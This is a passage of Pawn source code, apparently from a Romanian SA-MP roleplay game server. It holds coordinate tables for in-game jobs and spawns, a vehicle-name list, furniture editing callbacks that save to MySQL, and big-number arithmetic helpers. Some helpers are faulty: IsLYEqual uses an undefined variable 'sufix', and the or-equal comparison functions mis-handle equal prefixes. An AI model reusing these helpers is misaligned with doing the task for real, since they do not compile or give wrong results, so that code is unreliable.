{0.148646, -0.005935, -0.004058, 358.201873, 0.415596, 1.360260},//Skin - 216
{0.148646, -0.015611, -0.004058, 358.201873, 0.415596, 340.374938},//Skin - 217
{0.133952, -0.030138, -0.009880, 358.201873, 0.415596, 340.374938},//Skin - 218
{0.140503, -0.033425, -0.005693, 358.201873, 0.415596, 340.374938},//Skin - 219
{0.114608, 0.009020, -0.009135, 358.201873, 0.415596, 352.932006},//Skin - 220
{0.186516, -0.044762, -0.009135, 358.201873, 0.415596, 344.217132},//Skin - 221
{0.186516, -0.044762, -0.009135, 358.201873, 0.415596, 344.217132},//Skin - 222
{0.179908, -0.010779, -0.009135, 358.201873, 0.415596, 344.217132},//Skin - 223
{0.156689, -0.015437, -0.009135, 358.201873, 0.415596, 352.741638},//Skin - 224
{0.156689, -0.015437, -0.009135, 358.201873, 0.415596, 352.741638},//Skin - 225
{0.134990, -0.034685, -0.009135, 358.201873, 0.415596, 340.812927},//Skin - 226
{0.151760, 0.002680, -0.009135, 358.201873, 0.415596, 340.812927},//Skin - 227
{0.167410, -0.028664, -0.009135, 358.201873, 0.415596, 340.250427},//Skin - 228
{0.127699, -0.015571, -0.006103, 358.201873, 0.415596, 347.232238},//Skin - 229
{0.100555, -0.007753, -0.006103, 358.201873, 0.415596, 347.232238},//Skin - 230
{0.126940, 0.016886, -0.006103, 358.201873, 0.415596, 347.232238},//Skin - 231
{0.132949, -0.017515, -0.008594, 358.201873, 0.415596, 347.232238},//Skin - 232
{0.146124, -0.008425, -0.008594, 358.201873, 0.415596, 347.232238},//Skin - 233
{0.125714, -0.021018, -0.008594, 358.201873, 0.415596, 347.232238},//Skin - 234
{0.084982, -0.009809, -0.008594, 358.201873, 0.415596, 347.232238},//Skin - 235
{0.114669, -0.005190, -0.008594, 358.201873, 0.415596, 351.301177},//Skin - 236
{0.123264, -0.014946, -0.008594, 358.201873, 0.415596, 351.301177},//Skin - 237
{0.146656, -0.023925, -0.006749, 358.201873, 0.415596, 334.356781},//Skin - 238
{0.133769, -0.007373, -0.006749, 358.201873, 0.415596, 343.105895},//Skin - 239
{0.165378, -0.020173, -0.005869, 358.201873, 0.415596, 348.352233},//Skin - 240
{0.143331, -0.133577, -0.011472, 358.201873, 0.415596, 312.328857},//Skin - 241
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 242
{0.098602, 0.002084, -0.011472, 358.201873, 0.415596, 348.195495},//Skin - 243
{0.124240, -0.011682, -0.006423, 358.201873, 0.415596, 341.555999},//Skin - 244
{0.158155, -0.044311, -0.005439, 358.201873, 0.415596, 336.024902},//Skin - 245
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 246
{0.164307, -0.040974, -0.006797, 358.201873, 0.415596, 337.067047},//Skin - 247
{0.191578, -0.040435, -0.010605, 358.201873, 0.415596, 340.908203},//Skin - 248
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 249
{0.135208, -0.015243, -0.011916, 358.201873, 0.415596, 340.908203},//Skin - 250
{0.134272, -0.027377, -0.006035, 358.201873, 0.415596, 333.416168},//Skin - 251
{0.158813, -0.038977, -0.006035, 358.201873, 0.415596, 336.013519},//Skin - 252
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 253
{0.165106, -0.048880, -0.009719, 358.201873, 0.415596, 331.050933},//Skin - 254
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 255
{0.142586, 0.020829, -0.008549, 358.201873, 0.415596, 2.765411},//Skin - 256
{0.134018, -0.024462, -0.008549, 358.201873, 0.415596, 339.642486},//Skin - 257
{0.147750, -0.042854, -0.008114, 0.951334, 0.415596, 330.441131},//Skin - 258
{0.147750, -0.042854, -0.008114, 0.951334, 0.415596, 330.441131},//Skin - 259
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 260
{0.134710, 0.006798, -0.008114, 358.188964, 0.415596, 352.703582},//Skin - 261
{0.111691, 0.006798, -0.008114, 358.188964, 0.415596, 352.703582},//Skin - 262
{0.146077, -0.005195, -0.008114, 358.188964, 0.415596, 3.866970},//Skin - 263
{0.135858, -0.157842, -0.008114, 358.188964, 0.415596, 314.852203},//Skin - 264
{0.127964, 0.000132, -0.008114, 358.188964, 0.415596, 352.699432},//Skin - 265
{0.127964, -0.002646, -0.008114, 358.188964, 0.415596, 352.699432},//Skin - 266
{0.132329, -0.014261, -0.007384, 1.504234, 0.415596, 352.699432},//Skin - 267
{0.145951, -0.043442, -0.010053, 1.504234, 0.415596, 320.469390},//Skin - 268
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 269
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 270
{0.141851, -0.034538, -0.010580, 1.504234, 0.415596, 340.349456},//Skin - 271
{0.136473, -0.057088, -0.008204, 1.504234, 0.415596, 318.134399},//Skin - 272
{0.140332, -0.013011, -0.004432, 354.106964, 357.498840, 352.802062}, //Skin - 273
{0.124270, 0.003252, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 274
{0.131583, 0.007682, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 275
{0.131583, 0.007682, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 276
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 277
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 278
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 279
{0.131583, 0.007682, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 280
{0.131583, 0.007682, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 281
{0.140515, 0.009018, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 282
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 283
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 284
{0.189940, -0.004297, 0.001481, 354.106964, 357.498840, 352.802062},//Skin - 285
{0.140515, 0.001933, -0.008204, 1.504234, 0.415596, 346.744995}, //Skin - 286
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 287
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 288
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 289
{0.128789, -0.014062, -0.007850, 1.504234, 0.415596, 340.341094},//Skin - 290
{0.158929, -0.027358, -0.010655, 1.504234, 0.415596, 337.298858},//Skin - 291
{0.113309, -0.012434, -0.010655, 1.504234, 0.415596, 337.298858},//Skin - 292
{0.0, 0.0, 0.0, 0.0, 0.0, 0.0},                                  //Skin - 293
{0.158438, -0.023891, -0.007217, 1.504234, 0.415596, 337.298858},//Skin - 294
{0.145000, -0.032054, -0.007217, 1.504234, 0.415596, 336.385589},//Skin - 295
{0.139293, -0.069554, -0.010619, 1.504234, 0.415596, 320.746429},//Skin - 296
{0.148252, -0.066463, -0.010619, 1.504234, 0.415596, 320.729705},//Skin - 297
{0.126423, -0.066463, -0.010619, 1.504234, 0.415596, 320.729705},//Skin - 298
{0.144949, -0.040691, -0.008599, 1.504234, 0.415596, 320.729705},//Skin - 299
{0.131583, 0.007682, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 300
{0.131583, 0.007682, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 301
{0.131583, 0.007682, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 302
{0.131583, 0.007682, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 303
{0.131583, 0.007682, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 304
{0.131583, 0.007682, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 305
{0.146124, -0.008425, -0.008594, 358.201873, 0.415596, 347.232238},//Skin - 306
{0.146124, -0.008425, -0.008594, 358.201873, 0.415596, 347.232238},//Skin - 307
{0.146124, -0.008425, -0.008594, 358.201873, 0.415596, 347.232238},//Skin - 308
{0.146124, -0.008425, -0.008594, 358.201873, 0.415596, 347.232238},//Skin - 309
{0.140515, 0.009018, -0.008204, 1.504234, 0.415596, 346.744995},//Skin - 310
{0.140515, 0.009018, -0.008204, 1.504234, 0.415596, 346.744995} //Skin - 311

};
// Standuri
new Float:Standuri[7][3] =
{
	{1180.5782,-957.0296,42.8693},
	{1182.0564,-1410.7627,13.4046},
	{1375.8887,-1043.5226,26.6699},
	{1576.0544,-1743.9414,13.5469},
	{1830.3126,-1884.4764,13.4439},
	{1946.9017,-1938.8370,13.5469},
	{354.3453,-2030.8059,7.9078}
};
// PIZZA JOB
new Float:gRandomPizza[30][3] = {
{1886.8344,-1116.9644,25.2734},
{2435.8706,-1303.3206,24.7403},
{2330.0266,-1681.6777,14.4268},
{2807.9863,-1179.1047,25.3741},
{2192.8167,-1003.7396,62.6182},
{2015.1249,-1703.4521,13.6904},
{256.2383,-1365.6805,53.1094},
{1496.9115,-690.0555,94.7500},
{1181.7395,-1074.4592,31.6719},
{206.7339,-1771.1189,4.2873},
{298.8037,-1155.8375,80.9099},
{1033.7893,-809.8940,101.8516},
{2483.3259,-1997.9877,13.8343},
{1873.7358,-2020.6090,13.5469},
{650.3296,-1619.5085,15.0000},
{2257.5620,733.0655,11.4609},
{1935.6852,739.5255,10.8203},
{2787.9856,2223.3850,14.6615},
{2625.0615,2016.8232,10.8203},
{1599.3604,2147.3357,11.4609},
{1025.9944,1975.8160,11.3449},
{1703.6294,2694.0879,10.8203},
{1972.5380,927.4847,10.8203},
{1938.6154,2184.8523,10.8203},
{1682.1293,1913.6169,10.8203},
{988.3104,1879.0475,11.3594},
{1458.3400,2523.8979,10.8203},
{2484.4036,1528.7244,10.9017},
{2225.0576,2520.0786,10.8203},
{1531.1907,2357.5469,10.8203}
};
//EVENT SAC
enum mbinfo
{
        Float:XPOS,
        Float:YPOS,
        Float:ZPOS,
        PositionSac[33]
}

/*new Float:MBSPAWN[][mbinfo] =
{
        {1799.3871,-1954.9878,13.5469, "Spawn Taxi"},
        {1482.7518,-1727.2457,13.5469, "Primarie"},
        {2473.0825,-1662.9651,13.3275, "Grovre Street"},
        {708.8915,-1410.2430,13.3902, "Los Vagos"},
        {657.9171,-596.8641,16.1875, "FBI"},
        {1024.2977,-340.9484,73.9922, "Hitman"},
        {1201.7919,-1347.2415,13.4007, "Paramedic"},
   	    {2402.3862,1622.4178,10.8203, "SI"},
        {1495.5387,2784.6790,10.8203, "Los Astecas"},
        {1397.5110,771.3938,12.9100, "Ballas"},
        {-294.8404,1504.9608,75.6932, "News Reporter"},
		{1071.7842,2926.0745,40.5279,"Las Venturas"},
		{256.2783,2886.3787,12.3576,"Bone County"},
		{-1416.5194,-1518.7616,101.7017,"Whetston"},
		{-2501.8896,-699.1436,139.3203,"Missionari Hill"},
		{-2797.6414,-1526.4550,139.2283,"Chiliad"},
		{807.0738,1692.8014,5.2870,"County"},
		{861.2828,-34.8790,63.0358,"Fend Ridge"},
		{1503.2227,1.1327,24.4710,"Red County"},
		{-1385.9036,1489.9895,13.8438,"San Fierro"},
		{2921.9858,-1877.6909,9.2317,"Playa del Seville"},
		{2833.0698,-2446.8789,19.9220,"Los Santos"},
		{-741.5886,-118.5339,66.9856,"The Panopticom"},
		{2451.7278,-978.3174,79.6075,"Las Colinas"},
        {1526.2565,-1635.2454,13.3828, "LSPD"}
};*/

//TRUCKER JOB
new Float:CHKTruck[18][3] = {
{-99.2558,-1168.3788,2.5964}, //GAS LS ---- CHECKS LS
{1315.7880,-867.2107,39.5781}, //24/7 Store LS
{2116.6514,-1771.4202,13.3937}, //Pizza Boy LS
{2816.3660,-1698.8490,9.9504}, //8 Track LS
{2651.2346,-2390.4055,13.6328}, //Chop Shop LS
{2115.3047,-1723.7944,13.5502}, //Crack House LS
{2165.3979,2746.7004,10.8203}, //GAS LV ---- CHECKS LV
{2046.1804,2244.4304,10.8203}, //Clothing Soter LV
{2447.6467,1999.7650,10.8203}, //Burger Shot LV
{2503.0703,1531.9418,10.6749}, //Pool LV
{2032.2845,1516.1019,10.8203}, //Pirate Ship LV
{1483.8053,1046.6919,10.8203}, //Chuckup LV
{-1728.6168,-119.5973,3.5547}, //Ship SF ---- CHECKS SF
{-1694.2990,399.9545,7.1797}, //GAS SF
{-1672.8090,1322.6425,7.1853}, //Pier 69 SF
{-2110.9172,816.9711,69.5625}, //Supa Save SF
{-2533.0513,1227.8401,37.4219}, //Restaurant SF
{-2142.6599,-442.6247,35.3359} //Homies SF
};

//TRUCKER JOB2
new Float:CHKTruck2[18][3] = {
{-119.2522,-1218.2719,2.9902}, //LANGA GAS LS ---- CHECKS LS
{1361.1011,-906.6476,35.3157}, //LANGA 24/7 Store LS
{2078.8257,-1706.9739,13.3906}, //LANGA Pizza Boy LS
{2683.8926,-1683.9061,9.4250}, //LANGA 8 Track LS
{2609.1416,-2393.7742,13.6271}, //LANGA Chop Shop LS
{2158.9236,-1725.8071,13.5389}, //LANGA Crack House LS
{2101.4238,2803.3069,10.8203}, //LANGA GAS LV ---- CHECKS LV
{2116.0403,2189.2769,10.8203}, //LANGA Clothing Soter LV
{2426.0283,2005.2286,10.8203}, //LANGA Burger Shot LV
{2589.9490,1704.1989,10.8203}, //LANGA Pool LV
{2029.4589,1418.5114,10.8203}, //LANGA Pirate Ship LV
{1441.4424,1005.0969,10.8203}, //LANGA Chuckup LV
{-1731.8619,-71.2586,3.5489}, //LANGA Ship SF ---- CHECKS SF
{-1714.7142,352.0824,7.1875}, //LANGA GAS SF
{-1647.4458,1291.6462,7.0391}, //LANGA Pier 69 SF
{-2132.7087,769.0834,69.5625}, //LANGA Supa Save SF
{-2468.7771,1231.8475,35.2001}, //LANGA Restaurant SF
{-2184.9126,-409.3924,35.3359} //LANGA Homies SF
};
new Float:pozitie_tero[18][4] = {
	{-11.1283,1532.9020,12.8500,95.6434},
	{-11.0841,1530.2969,12.8500,99.4035},
	{-11.3477,1528.0222,12.8500,91.5701},
	{-13.9552,1527.9937,12.8500,90.3167},
	{-15.2163,1531.8525,12.8500,90.3167},
	{-14.3354,1537.3594,12.8500,87.8099},
	{-19.3985,1537.4155,12.8500,89.3766},
	{-19.9137,1533.7891,12.8500,89.3766},
	{-20.3886,1530.1121,12.8500,89.3766},
	{-9.9999,1510.2312,12.8500,88.7501},
	{-10.4591,1507.3409,12.8500,90.6302},
	{-10.8527,1503.3154,12.8500,90.6302},
	{-14.1856,1503.2784,12.8500,90.6302},
	{-14.6672,1506.8472,12.8500,90.6302},
	{-15.1424,1510.2953,12.8500,90.6302},
	{-19.4827,1510.2471,12.8500,90.6302},
	{-19.9190,1506.0282,12.8500,90.6302},
	{-20.7207,1502.0319,12.8500,90.6302}
};
new Float:pozitie_ctero[18][4] = {
	{36.9079,1533.7549,12.8500,270.3883},
	{41.3100,1533.7843,12.8500,270.3883},
	{44.7508,1534.0804,12.8500,269.1349},
	{36.7857,1530.5381,12.8500,269.1349},
	{42.0542,1530.4586,12.8500,269.1349},
	{45.0170,1530.5665,12.8500,269.1349},
	{35.6836,1527.3124,12.8500,269.1349},
	{42.3523,1527.2117,12.8500,269.1349},
	{44.4550,1527.9067,12.8500,269.1349},
	{36.4909,1511.9762,12.8500,273.8350},
	{40.8919,1512.0646,12.8500,273.8350},
	{44.5926,1512.2728,12.8500,273.5217},
	{36.6913,1508.0798,12.8500,269.4483},
	{41.7286,1508.0325,12.8500,269.4483},
	{45.6340,1507.8932,12.8500,269.4483},
	{37.0373,1504.2379,12.8500,269.4483},
	{42.8410,1504.1818,12.8500,269.4483},
	{45.3595,1504.6686,12.8500,269.4483}
};
// JAIL SPAWN
new Float:gRandomJailSpawns[3][3] = {
{263.7989,85.8850,1001.0391},
{264.0302,81.2118,1001.0391},
{263.8704,77.0021,1001.0391}
};
// AJAIL SPAWN
new Float:gRandomAJailSpawns[4][3] = {
{215.5260,110.5124,1000.0156},
{219.3602,109.9994,1000.0156},
{223.3645,109.9972,1000.0156},
{227.1875,110.2887,1000.0156}
};

// TOW CAR CHECKPOINT
new Float:TowCarCk[14][3] = {
{1209.6587,-1102.2660,25.1793},
{1013.2002,-1022.8221,32.1016},
{928.3862,-1081.9692,24.2891},
{856.1053,-1364.4233,13.5469},
{968.3508,-1710.0663,13.5546},
{1017.6634,-917.3149,42.1797},
{1268.3655,-1613.0262,13.5469},
{1433.0844,-1843.8458,13.5469},
{2051.3674,-2046.2601,13.5469},
{2137.6187,-2173.9358,13.5544},
{2215.5930,-2202.2126,13.5469},
{2468.5393,-2078.4360,13.5469},
{2699.9041,-1951.2253,13.5540},
{2662.4050,-1593.9717,13.3006}
};

// VEHICLE FUEL
#define GasMax 100
#define RunOutTime 30000
#define RefuelWait 10

#define CAR_AMOUNT 2000
new Gas[CAR_AMOUNT];

new Refueling[MAX_PLAYERS];

// VEHICLE NAME
new aVehicleNames[212][] =
{
	{"Landstalker"},
	{"Bravura"},
	{"Buffalo"},
	{"Linerunner"},
	{"Perrenial"},
	{"Sentinel"},
	{"Dumper"},
	{"Firetruck"},
	{"Trashmaster"},
	{"Stretch"},
	{"Manana"},
	{"Infernus"},
	{"Voodoo"},
	{"Pony"},
	{"Mule"},
	{"Cheetah"},
	{"Ambulance"},
	{"Leviathan"},
	{"Moonbeam"},
	{"Esperanto"},
	{"Taxi"},
	{"Washington"},
	{"Bobcat"},
	{"Mr Whoopee"},
	{"BF Injection"},
	{"Hunter"},
	{"Premier"},
	{"Enforcer"},
	{"Securicar"},
	{"Banshee"},
	{"Predator"},
	{"Bus"},
	{"Rhino"},
	{"Barracks"},
	{"Hotknife"},
	{"Trailer 1"},
	{"Previon"},
	{"Coach"},
	{"Cabbie"},
	{"Stallion"},
	{"Rumpo"},
	{"RC Bandit"},
	{"Romero"},
	{"Packer"},
	{"Monster"},
	{"Admiral"},
	{"Squalo"},
	{"Seasparrow"},
	{"Pizzaboy"},
	{"Tram"},
	{"Trailer 2"},
	{"Turismo"},
	{"Speeder"},
	{"Reefer"},
	{"Tropic"},
	{"Flatbed"},
	{"Yankee"},
	{"Caddy"},
	{"Solair"},
	{"Berkley's RC Van"},
	{"Skimmer"},
	{"PCJ-600"},
	{"Faggio"},
	{"Freeway"},
	{"RC Baron"},
	{"RC Raider"},
	{"Glendale"},
	{"Oceanic"},
	{"Sanchez"},
	{"Sparrow"},
	{"Patriot"},
	{"Quad"},
	{"Coastguard"},
	{"Dinghy"},
	{"Hermes"},
	{"Sabre"},
	{"Rustler"},
	{"ZR-350"},
	{"Walton"},
	{"Regina"},
	{"Comet"},
	{"BMX"},
	{"Burrito"},
	{"Camper"},
	{"Marquis"},
	{"Baggage"},
	{"Dozer"},
	{"Maverick"},
	{"News Chopper"},
	{"Rancher"},
	{"FBI-Rancher"},
	{"Virgo"},
	{"Greenwood"},
	{"Jetmax"},
	{"Hotring"},
	{"Sandking"},
	{"Blista Compact"},
	{"Police Maverick"},
	{"Boxville"},
	{"Benson"},
	{"Mesa"},
	{"RC Goblin"},
	{"Hotring Racer A"},
	{"Hotring Racer B"},
	{"Bloodring Banger"},
	{"Rancher"},
	{"Super GT"},
	{"Elegant"},
	{"Journey"},
	{"Bike"},
	{"Mountain Bike"},
	{"Beagle"},
	{"Cropdust"},
	{"Stunt"},
	{"Tanker"},
	{"Roadtrain"},
	{"Nebula"},
	{"Majestic"},
	{"Buccaneer"},
	{"Shamal"},
	{"Hydra"},
	{"FCR-900"},
	{"NRG-500"},
	{"HPV-1000"},
	{"Cement Truck"},
	{"Tow Truck"},
	{"Fortune"},
	{"Cadrona"},
	{"FBI-Truck"},
	{"Willard"},
	{"Forklift"},
	{"Tractor"},
	{"Combine"},
	{"Feltzer"},
	{"Remington"},
	{"Slamvan"},
	{"Blade"},
	{"Freight"},
	{"Streak"},
	{"Vortex"},
	{"Vincent"},
	{"Bullet"},
	{"Clover"},
	{"Sadler"},
	{"Firetruck LA"},
	{"Hustler"},
	{"Intruder"},
	{"Primo"},
	{"Cargobob"},
	{"Tampa"},
	{"Sunrise"},
	{"Merit"},
	{"Utility"},
	{"Nevada"},
	{"Yosemite"},
	{"Windsor"},
	{"Monster A"},
	{"Monster B"},
	{"Uranus"},
	{"Jester"},
	{"Sultan"},
	{"Stratum"},
	{"Elegy"},
	{"Raindance"},
	{"RC Tiger"},
	{"Flash"},
	{"Tahoma"},
	{"Savanna"},
	{"Bandito"},
	{"Freight Flat"},
	{"Streak Carriage"},
	{"Kart"},
	{"Mower"},
	{"Duneride"},
	{"Sweeper"},
	{"Broadway"},
	{"Tornado"},
	{"AT-400"},
	{"DFT-30"},
	{"Huntley"},
	{"Stafford"},
	{"BF-400"},
	{"Newsvan"},
	{"Tug"},
	{"Trailer 3"},
	{"Emperor"},
	{"Wayfarer"},
	{"Euros"},
	{"Hotdog"},
	{"Club"},
	{"Freight Carriage"},
	{"Trailer 3"},
	{"Andromada"},
	{"Dodo"},
	{"RC Cam"},
	{"Launch"},
	{"Police Car"},
	{"Police Car"},
	{"Police Car"},
	{"Ranger"},
	{"Picador"},
	{"S.W.A.T. Van"},
	{"Alpha"},
	{"Phoenix"},
	{"Glendale"},
	{"Sadler"},
	{"Luggage Trailer A"},
	{"Luggage Trailer B"},
	{"Stair Trailer"},
	{"Boxville"},
	{"Farm Plow"},
	{"Utility Trailer"}
};
//ADAUGARE MOBILA / EDITARE MOBILA.
public OnPlayerSelectDynamicObject(playerid, objectid, modelid, Float: x, Float: y, Float: z)
{
	switch(SelectMode[playerid])
	{
	    case SELECT_MODE_EDIT: EditDynamicObject(playerid, objectid);
	    case SELECT_MODE_SELL:
	    {
	        CancelEdit(playerid);
			new data[e_furniture], string[1000];
			SetPVarInt(playerid, "SelectedFurniture", objectid);
			Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
			format(string, sizeof(string), "Want to sell this model Furniture (%s)?\nSelling price {2ECC71}$%s.", HouseFurnitures[ data[ArrayID] ][Name3], FormatNumber(HouseFurnitures[ data[ArrayID] ][Price]));
			ShowPlayerDialog(playerid, DIALOG_HOUSE+13, DIALOG_STYLE_MSGBOX, "Sale", string, "Sell", "Close");
		}
	}

	return 1;
}
public OnPlayerEditDynamicObject(playerid, objectid, response, Float: x, Float: y, Float: z, Float: rx, Float: ry, Float: rz)
{
	switch(response)
	{
	    case EDIT_RESPONSE_CANCEL:
	    {
	        new data[e_furniture];
	        Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
	        SetDynamicObjectPos(objectid, data[furnitureX], data[furnitureY], data[furnitureZ]);
	        SetDynamicObjectRot(objectid, data[furnitureRX], data[furnitureRY], data[furnitureRZ]);
	    }

		case EDIT_RESPONSE_FINAL:
		{
		    new data[e_furniture], query[1000];
		    Streamer_GetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);
		    data[furnitureX] = x;
		    data[furnitureY] = y;
		    data[furnitureZ] = z;
            data[furnitureRX] = rx;
            data[furnitureRY] = ry;
            data[furnitureRZ] = rz;
            SetDynamicObjectPos(objectid, data[furnitureX], data[furnitureY], data[furnitureZ]);
	        SetDynamicObjectRot(objectid, data[furnitureRX], data[furnitureRY], data[furnitureRZ]);
	        Streamer_SetArrayData(STREAMER_TYPE_OBJECT, objectid, E_STREAMER_EXTRA_ID, data);

	        mysql_format(SQL, query, sizeof(query), "UPDATE housefurnitures SET FurnitureX=%f, FurnitureY=%f, FurnitureZ=%f, FurnitureRX=%f, FurnitureRY=%f, FurnitureRZ=%f WHERE ID=%d", data[furnitureX], data[furnitureY], data[furnitureZ], data[furnitureRX], data[furnitureRY], data[furnitureRZ], data[SQLID]);
	        mysql_tquery(SQL, query, "", "");
		}
	}

	return 1;
}
// STOCK TRILIOANE
stock FormatBigNumber(suma[LY_STRING_LEN]) // by DeaThWiN.
{
	new simbol[2] = ",";
	new setat = 0;
	for(new i = 3; i < LY_STRING_LEN; i++) 
	{
		if(setat == 0)
		{
			if(strlen(suma) > i && strlen(suma) <= 6) 
			{	strins(suma, simbol, strlen(suma)-3, sizeof(suma)); }
			else if(strlen(suma)+1 > i && strlen(suma) > 6 && strlen(suma) < 10) 
			{	strins(suma, simbol, strlen(suma)-6, sizeof(suma)); strins(suma, simbol, strlen(suma)-3, sizeof(suma)); }
			else if(strlen(suma)+1 > i && strlen(suma) > 9 && strlen(suma) < 13) 
			{	strins(suma, simbol, strlen(suma)-9, sizeof(suma)); strins(suma, simbol, strlen(suma)-6, sizeof(suma)); strins(suma, simbol, strlen(suma)-3, sizeof(suma)); }
			else if(strlen(suma)+1 > i && strlen(suma) > 12) 
			{	strins(suma, simbol, strlen(suma)-12, sizeof(suma)),strins(suma, simbol, strlen(suma)-9, sizeof(suma)); strins(suma, simbol, strlen(suma)-6, sizeof(suma)); strins(suma, simbol, strlen(suma)-3, sizeof(suma)); }
			setat = 1;
		}	
	}	
	return suma;
}




forward  bool:IsValueContainLY(prefix,suffix,value);
stock bool:IsValueContainLY(prefix,suffix,value)
{
	if((prefix == 0) && (suffix == 0)) return false;
	if((suffix < value) && (prefix == 0)) return false;
	return true;
}
stock GetLYString(prefix,suffix,string[],maxdest = sizeof(string)){
	if(prefix == 0){
		format(string,maxdest,"%d",suffix);
	} else {
		format(string,maxdest,"%d%09d",prefix,suffix);
	}
}

//Pawn Unsigned Long for 32 Bit language (precision 61-bit)
stock addVV(&prefix,&suffix,value,limitprefix = DEFAULT_MAX_LY_PREFIX){
		if(value == 0) return 1; //skip
		
		new tmp = value;
		
		if((tmp > 0) && (prefix >= limitprefix) && (suffix >= 0)){
			prefix = limitprefix;
			suffix = 0;
		} else if((tmp > 0) && (prefix >= limitprefix-1) && (suffix >= 999999999)){
			prefix = limitprefix;
			suffix = 0;
		} else if((tmp > 0) && (prefix >= limitprefix) && (suffix >= 999999999)){
			prefix = limitprefix;
			suffix = 0;
		}
		else 
		{
			if(value >= 0){
				while(tmp >= 1000000000){
					tmp -= 1000000000;
					prefix += 1;
				}
				suffix += tmp;
				while(suffix > 999999999){
					suffix -= 1000000000;
					prefix += 1;
				}
			} 
			else if(value < 0)
			{
				while(tmp <= -1000000000)
				{
					prefix -= 1;
					tmp += 1000000000;
				}
				suffix += (tmp);
				while(suffix < 0)
				{
					suffix += 1000000000;
					prefix -= 1;
				}
				if(prefix < 0){
					prefix = 0;
					suffix = 0;
				}
			}
		}
		if((prefix >= limitprefix) && (suffix >= 0))
		{
			prefix = limitprefix;
			suffix = 0;
		}
		return 1;
}
stock AddSeparatorLY(string[],separator[]){ 
	new tStr[MAX_SEP_LY_STRING];
	format(tStr,sizeof(tStr),"%s",string); 

	if(strlen(tStr) < 4) return tStr; 
	new iPos = strlen(tStr), iCount = 1; 

	while(iPos > 0){ 
		if(iCount == 4){ 
			iCount = 0; 
			strins(tStr,separator[0],iPos,1); 
			iPos++; 
		}
		iCount++; 
		iPos--; 
	} 
	return tStr; 
}

stock DeleteSeparatorLY(string[],separator[]){ 
	new tStr[MAX_LY_STRING], idx = 0;
	for(new i = 0, j = strlen(string); i < j ; i++){
		if(string[i] != separator[0]){
			tStr[idx] = string[i];
			idx++;
		}
	}
	return tStr; 
}

stock CalculatePercentLY(&prefix,&suffix,Float:percent = 0.0,bool:increase = true,limitprefix = DEFAULT_MAX_LY_PREFIX){
	new Float:lycut = (prefix*(percent/100.0)),
		modify_p = floatround(lycut),
		modify_s = floatround((lycut-modify_p)*100000) * 10000;
	
	if(increase){
		prefix += modify_p;
		UpdateLY(prefix,suffix,modify_s,limitprefix);
		modify_s = floatround(suffix*(percent/100.0));
		UpdateLY(prefix,suffix,modify_s,limitprefix);
	} else {
		prefix -= modify_p;
		UpdateLY(prefix,suffix,-modify_s,limitprefix);
		modify_s = floatround(suffix*(percent/100.0));
		UpdateLY(prefix,suffix,-modify_s,limitprefix);
	}
}

stock GetPercentLY(prefix,suffix,&o_prefix,&o_suffix,Float:percent = 0.0,limitprefix = DEFAULT_MAX_LY_PREFIX){
	o_suffix = 0, o_prefix = 0;
	
	new Float:lycut = (prefix*(percent/100.0)),
		modify_p = floatround(lycut),
		modify_s = floatround((lycut-modify_p)*100000) * 10000;
		
	o_prefix += modify_p;
	UpdateLY(o_prefix,o_suffix,modify_s,limitprefix);
	modify_s = floatround(suffix*(percent/100.0));
	UpdateLY(o_prefix,o_suffix,modify_s,limitprefix);

}

//Operator  a == b
stock bool:IsLYEqual(prefix,suffix,from_prefix,from_suffix){
	if(prefix == from_prefix && sufix == from_suffix) return true;
	return false;
}

//Operator  a < b
stock bool:IsLYSmallerThan(prefix,suffix,from_prefix,from_suffix){
	if(prefix < from_prefix) return true;
	if(prefix == from_prefix && suffix < from_suffix) return true;
	return false;
}

//Operator  a <= b
stock bool:IsLYSmallerThanOrEqual(prefix,suffix,from_prefix,from_suffix){
	if(prefix <= from_prefix) return true;
	if(prefix == from_prefix && suffix <= from_suffix) return true;
	return false;
}

//Operator  a > b
stock bool:IsLYBiggerThan(prefix,suffix,from_prefix,from_suffix){
	if(prefix > from_prefix) return true;
	if(prefix == from_prefix && suffix > from_suffix) return true;
	return false;
}

//Operator a >= b
stock bool:IsLYBiggerThanOrEqual(prefix,suffix,from_prefix,from_suffix){
	if(prefix >= from_prefix) return true;
	if(prefix == from_prefix && suffix >= from_suffix) return true;
	return false;
}

//Reverse to GetLYString
stock LYStringToLY(&prefix,&suffix,string[]){
	new len = strlen(string);
	prefix = 0, suffix = 0;
	for(new i = strlen(string)-1; i >= 0; i--){
		if(len-i <= 9){
			suffix += (string[i]-48)*floatround(floatpower(10,len-i-1));
		} else {
			prefix += (string[i]-48)*floatround(floatpower(10,len-i-10));
		}
	}
}
//STOCK MOBILA.
